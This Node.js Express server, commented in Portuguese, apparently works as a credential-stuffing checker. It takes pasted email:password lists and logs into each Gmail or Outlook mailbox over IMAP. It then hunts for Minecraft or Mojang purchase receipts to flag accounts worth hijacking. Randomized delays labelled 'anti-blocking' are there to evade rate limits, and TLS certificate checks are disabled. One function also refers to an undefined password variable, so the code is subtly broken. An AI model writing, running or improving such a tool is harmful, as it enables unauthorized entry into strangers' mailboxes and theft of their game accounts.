const express = require('express');
const cors = require('cors');
const imaps = require('imap-simple');

// --- CONFIGURAÇÕES ---
const app = express();
const PORT = 5000;

const MIN_DELAY_SECONDS = 5;
const MAX_DELAY_SECONDS = 15;
const HIGH_VALUE_KEYWORDS = ["receipt", "recibo", "compra", "pedido", "order", "invoice", "confirmation"];
const CONTEXT_KEYWORDS = ["minecraft", "mojang"];
const TRUSTED_SENDERS = ["microsoft", "xbox", "mojang"];

// Middleware para permitir comunicação com o frontend e para entender JSON
app.use(cors());
app.use(express.json());

// --- FUNÇÕES AUXILIARES ---
function getImapConfig(email) {
    const domain = email.split('@')[1].toLowerCase();
    let host = '';
    if (domain.includes('gmail')) {
        host = 'imap.gmail.com';
    } else if (domain.includes('outlook') || domain.includes('hotmail') || domain.includes('live')) {
        host = 'outlook.office365.com';
    } else {
        return null; // Host não conhecido
    }
    return {
        imap: {
            user: email,
            password: password, // A senha será passada depois
            host: host,
            port: 993,
            tls: true,
            authTimeout: 3000,
            tlsOptions: { rejectUnauthorized: false }
        }
    };
}

function scoreEmail(msg) {
    let score = 0;
    const subject = (msg.headers.subject && msg.headers.subject[0]) ? msg.headers.subject[0].toLowerCase() : '';
    const from = (msg.headers.from && msg.headers.from[0]) ? msg.headers.from[0].toLowerCase() : '';

    if (TRUSTED_SENDERS.some(sender => from.includes(sender))) score += 5;
    if (HIGH_VALUE_KEYWORDS.some(keyword => subject.includes(keyword))) score += 3;
    if (CONTEXT_KEYWORDS.some(keyword => subject.includes(keyword))) score += 2;
    if (score >= 10) score += 5;

    return score;
}

async function processAccount(email, password) {
    const config = getImapConfig(email);
    if (!config) {
        return { status: "error", message: "Host IMAP não encontrado" };
    }
    config.imap.password = password;

    let connection;
    try {
        connection = await imaps.connect(config);
        await connection.openBox('INBOX');

        const searchCriteria = ['OR', ['SUBJECT', 'minecraft'], ['SUBJECT', 'mojang']];
        const fetchOptions = { bodies: ['HEADER.FIELDS (FROM SUBJECT DATE)'], struct: true };
        const messages = await connection.search(searchCriteria, fetchOptions);

        let bestEmail = { score: 0, subject: '', from: '' };

        for (const msg of messages) {
            const score = scoreEmail(msg.parts[0].body);
            if (score > bestEmail.score) {
                bestEmail = {
                    score: score,
                    subject: msg.parts[0].body.subject[0],
                    from: msg.parts[0].body.from[0]
                };
            }
        }
        connection.end();
        
        if (bestEmail.score >= 8) {
            return { status: "success", data: bestEmail };
        }
        return { status: "not_found", message: "Nenhuma evidência relevante encontrada." };

    } catch (err) {
        if (connection) connection.end();
        return { status: "error", message: `Falha no login ou na busca: ${err.message}` };
    }
}

// --- ROTA DA API ---
app.post('/verificar', async (req, res) => {
    const { accounts: accountsText } = req.body;

    if (!accountsText) {
        return res.status(400).json({ error: "A lista de contas está vazia." });
    }

    const accounts = accountsText.split('\n').map(line => line.trim()).filter(line => line.includes(':'));
    const foundAccounts = [];

    for (const accountLine of accounts) {
        const [email, password] = accountLine.split(":", 2);
        
        console.log(`Verificando: ${email}`);
        const result = await processAccount(email, password);
        
        if (result.status === "success") {
            console.log(`[+] SUCESSO para ${email}`);
            foundAccounts.push({
                login: accountLine,
                evidence: result.data
            });
        } else {
            console.log(`[-] Falha ou nada encontrado para ${email}: ${result.message}`);
        }
        
        // Pausa anti-bloqueio
        const delay = Math.random() * (MAX_DELAY_SECONDS - MIN_DELAY_SECONDS) + MIN_DELAY_SECONDS;
        console.log(`Aguardando ${delay.toFixed(1)} segundos...`);
        await new Promise(resolve => setTimeout(resolve, delay * 1000));
    }

    res.json({ found_accounts: foundAccounts });
});


// --- INICIAR SERVIDOR ---
app.listen(PORT, () => {
    console.log(`Servidor iniciado em http://127.0.0.1:${PORT}`);
    console.log("Abra o arquivo index.html no seu navegador para usar a interface.");
});
